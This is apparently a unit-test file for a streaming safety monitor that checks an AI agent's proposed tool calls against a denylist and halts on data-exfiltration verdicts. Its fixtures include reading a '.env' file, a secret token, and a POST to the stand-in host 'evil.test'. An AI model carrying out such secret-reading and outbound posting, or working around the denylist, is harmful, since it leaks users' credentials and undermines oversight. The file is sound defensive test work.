"""Unit tests for agent_iam.runtime.stream.StreamingMonitor.

These run WITHOUT torch / a real model: a `FakeMonitor` stub returns a
scripted `Verdict` (STOP when the proposed tool is in a denylist, else OK).
We cover trace accumulation across observe/commit, step_idx monotonicity,
guard returning the monitor's verdict without polluting the trace, the
auto-halt behavior of the `guarded` generator, and reset().
"""

from __future__ import annotations

from agent_iam.runtime import StreamingMonitor
from agent_iam.schema import Role, Trajectory, Verdict

# ---------------------------------------------------------------------------
# Fake monitor (no torch / no model)
# ---------------------------------------------------------------------------


class FakeMonitor:
    """Scripted single-step monitor: STOP iff the proposed tool is denied.

    Records every (trajectory snapshot length, action) it was asked about so
    tests can assert what the monitor actually saw.
    """

    def __init__(self, denylist=("Send", "POST")):
        self.denylist = set(denylist)
        self.calls: list[tuple[int, dict]] = []

    def check(self, trace: Trajectory, next_action: dict) -> Verdict:
        self.calls.append((len(trace.steps), next_action))
        tool = next_action.get("tool", "")
        if tool in self.denylist:
            return Verdict(
                symbol="STOP",
                risk_type="data_exfiltration",
                explanation=f"{tool} is denied",
                p_stop=0.99,
                threshold=0.5,
                next_action_repr=str(next_action),
            )
        return Verdict(symbol="OK", p_stop=0.01, threshold=0.5, next_action_repr=str(next_action))


def _sm(**kw) -> StreamingMonitor:
    return StreamingMonitor(FakeMonitor(), task_instruction="do the task", **kw)


# ---------------------------------------------------------------------------
# Construction / accessors
# ---------------------------------------------------------------------------


def test_starts_empty_with_header():
    sm = _sm()
    assert sm.history == []
    assert sm.verdicts == []
    assert isinstance(sm.trajectory, Trajectory)
    assert sm.trajectory.task_instruction == "do the task"
    assert sm.trajectory.source == "live"


def test_source_propagates_to_trajectory():
    sm = StreamingMonitor(FakeMonitor(), source="langgraph")
    assert sm.trajectory.source == "langgraph"
    assert sm.trajectory.id == "langgraph-stream"


# ---------------------------------------------------------------------------
# observe / commit accumulation + step_idx monotonicity
# ---------------------------------------------------------------------------


def test_observe_appends_non_decision_step():
    sm = _sm()
    step = sm.observe(role="user", content="hello")
    assert step.role == Role.USER
    assert step.content == "hello"
    assert step.action is None
    assert sm.history == [step]
    assert step.step_idx == 0


def test_observe_accepts_role_enum_and_string():
    sm = _sm()
    s1 = sm.observe(role=Role.SYSTEM, content="sys")
    s2 = sm.observe(role="tool", observation="result")
    assert s1.role == Role.SYSTEM
    assert s2.role == Role.TOOL
    assert s2.observation == "result"


def test_commit_appends_agent_step():
    sm = _sm()
    step = sm.commit(action={"tool": "Read", "args": {"file_path": ".env"}}, thought="peek")
    assert step.role == Role.AGENT
    assert step.thought == "peek"
    assert step.action == {"tool": "Read", "args": {"file_path": ".env"}}
    assert len(sm.history) == 1


def test_commit_with_observation_appends_tool_step():
    sm = _sm()
    sm.commit(action={"tool": "Read", "args": {}}, observation="TOKEN=abc")
    assert len(sm.history) == 2
    agent, tool = sm.history
    assert agent.role == Role.AGENT
    assert tool.role == Role.TOOL
    assert tool.observation == "TOKEN=abc"


def test_step_idx_is_monotonic_across_mixed_appends():
    sm = _sm()
    sm.observe(role="user", content="task")
    sm.commit(action={"tool": "Read", "args": {}}, observation="obs1")
    sm.commit(action={"tool": "Grep", "args": {}})
    sm.observe(role="tool", observation="obs2")
    idxs = [s.step_idx for s in sm.history]
    assert idxs == list(range(len(sm.history)))
    assert idxs == [0, 1, 2, 3, 4]


# ---------------------------------------------------------------------------
# guard: returns the monitor's verdict, does NOT mutate the trace
# ---------------------------------------------------------------------------


def test_guard_returns_monitor_verdict_ok():
    sm = _sm()
    sm.observe(role="user", content="task")
    v = sm.guard({"tool": "Read", "args": {"file_path": ".env"}})
    assert v.symbol == "OK"
    assert v.block is False


def test_guard_returns_monitor_verdict_stop():
    sm = _sm()
    v = sm.guard({"tool": "POST", "args": {"url": "http://evil.test"}})
    assert v.symbol == "STOP"
    assert v.block is True
    assert v.risk_type == "data_exfiltration"


def test_guard_does_not_pollute_trace():
    sm = _sm()
    sm.observe(role="user", content="task")
    before = len(sm.history)
    sm.guard({"tool": "POST", "args": {}})
    assert len(sm.history) == before  # the proposed action is NOT committed


def test_guard_records_verdict_history():
    sm = _sm()
    sm.guard({"tool": "Read", "args": {}})
    sm.guard({"tool": "POST", "args": {}})
    assert [v.symbol for v in sm.verdicts] == ["OK", "STOP"]


def test_guard_sees_committed_trace():
    fake = FakeMonitor()
    sm = StreamingMonitor(fake, task_instruction="t")
    sm.observe(role="user", content="task")
    sm.commit(action={"tool": "Read", "args": {}}, observation="obs")
    sm.guard({"tool": "POST", "args": {}})
    # The monitor was handed a 3-step trace (user, agent, tool) for the guard.
    seen_len, seen_action = fake.calls[-1]
    assert seen_len == 3
    assert seen_action == {"tool": "POST", "args": {}}


# ---------------------------------------------------------------------------
# guarded() generator + auto-halt
# ---------------------------------------------------------------------------


def test_guarded_yields_action_verdict_pairs():
    sm = _sm()
    actions = [{"tool": "Read", "args": {}}, {"tool": "Grep", "args": {}}]
    pairs = list(sm.guarded(actions))
    assert [a["tool"] for a, _ in pairs] == ["Read", "Grep"]
    assert all(v.symbol == "OK" for _, v in pairs)


def test_guarded_auto_halts_on_stop():
    sm = _sm(auto_halt=True)
    actions = [
        {"tool": "Read", "args": {}},
        {"tool": "POST", "args": {}},   # denied -> STOP
        {"tool": "Grep", "args": {}},   # should never be reached
    ]
    pairs = list(sm.guarded(actions))
    assert [a["tool"] for a, _ in pairs] == ["Read", "POST"]
    assert pairs[-1][1].block is True
    # The blocking action is yielded but never committed.
    assert sm.history == []


def test_guarded_continues_past_stop_when_auto_halt_off():
    sm = _sm(auto_halt=False)
    actions = [
        {"tool": "POST", "args": {}},
        {"tool": "Grep", "args": {}},
    ]
    pairs = list(sm.guarded(actions))
    assert [a["tool"] for a, _ in pairs] == ["POST", "Grep"]
    assert [v.symbol for _, v in pairs] == ["STOP", "OK"]


# ---------------------------------------------------------------------------
# reset
# ---------------------------------------------------------------------------


def test_reset_clears_trace_and_verdicts_but_keeps_config():
    sm = _sm()
    sm.observe(role="user", content="task")
    sm.commit(action={"tool": "Read", "args": {}})
    sm.guard({"tool": "POST", "args": {}})
    assert sm.history and sm.verdicts

    sm.reset()
    assert sm.history == []
    assert sm.verdicts == []
    # Config survives; the trajectory is freshly rebuilt with the same header.
    assert sm.trajectory.task_instruction == "do the task"
    assert sm.trajectory.source == "live"


def test_reset_allows_reuse():
    sm = _sm()
    sm.commit(action={"tool": "Read", "args": {}})
    sm.reset()
    v = sm.guard({"tool": "POST", "args": {}})
    assert v.block is True
    assert len(sm.history) == 0
